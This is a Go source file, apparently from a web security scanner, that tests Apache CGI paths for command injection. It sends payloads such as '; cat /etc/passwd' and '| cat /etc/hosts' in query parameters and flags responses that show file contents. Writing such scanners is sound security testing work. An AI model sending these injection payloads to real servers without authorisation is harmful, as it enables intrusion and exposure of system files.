package apache

import (
	"context"
	"strings"

	methodwebtest "github.com/Method-Security/methodwebtest/generated/go"
	utils "github.com/Method-Security/methodwebtest/utils/engines"
)

var commandInjectionPayloads = []string{
	"; cat /etc/passwd",
	"| cat /etc/hosts",
	"&& ls -la",
	"; echo 'vulnerable'",
	"| echo 'RCE'",
}

var commonModFilePaths = []string{
	"/test.cgi",
	"/admin.cgi",
	"/login.cgi",
	"/status.cgi",
	"/user.cgi",
	"/printenv.cgi",
	"/cgi-bin/test.cgi",
	"/cgi-bin/admin.cgi",
	"/cgi-bin/login.cgi",
	"/cgi-bin/status.cgi",
	"/cgi-bin/user.cgi",
	"/cgi-bin/printenv.cgi",
}

func PerformApachePathModFileInjection(ctx context.Context, config *methodwebtest.PathModFileConfig) *methodwebtest.Report {
	generatedInjectionPayloads := generateModFileQueryInjectionParams(commandInjectionPayloads)

	injectionConfig := methodwebtest.InjectionEngineConfig{
		Targets:           config.Targets,
		Method:            methodwebtest.HttpMethodPost,
		Paths:             commonModFilePaths,
		InjectedPayloads:  generatedInjectionPayloads,
		InjectionLocation: methodwebtest.InjectionLocationQuery,
		EventType:         methodwebtest.NewEventTypeFromMultiEvent(methodwebtest.MultiEventCommandecho),
		Timeout:           config.Timeout,
		Retries:           config.Retries,
		Sleep:             config.Sleep,
	}

	report := utils.RunMultiInjectionsEngine(ctx, &injectionConfig)
	detectModFileRCE(report)
	report.Config = methodwebtest.NewEngineConfigFromInjectionEngineConfig(&injectionConfig)
	return report
}

func generateModFileQueryInjectionParams(commandInjectionPayloads []string) []map[string]string {
	payloads := []map[string]string{}
	for _, payload := range commandInjectionPayloads {
		payloads = append(payloads, map[string]string{"input": payload})
	}
	return payloads
}

func detectModFileRCE(report *methodwebtest.Report) {
	// Deterministic detection function
	indicators := []string{
		"root:x",     // Common content in /etc/passwd
		"127.0.0.1",  // Common content in /etc/hosts
		"vulnerable", // Custom echo
		"RCE",        // Custom echo
		"total",      // Common output of ls -la
	}
	for _, target := range report.Targets {
		for _, attempt := range target.Attempts {
			finding := false
			for _, indicator := range indicators {
				if strings.Contains(*attempt.Request.ResponseBody, indicator) {
					finding = true
				}
			}
			attempt.Finding = &finding
		}
	}
}
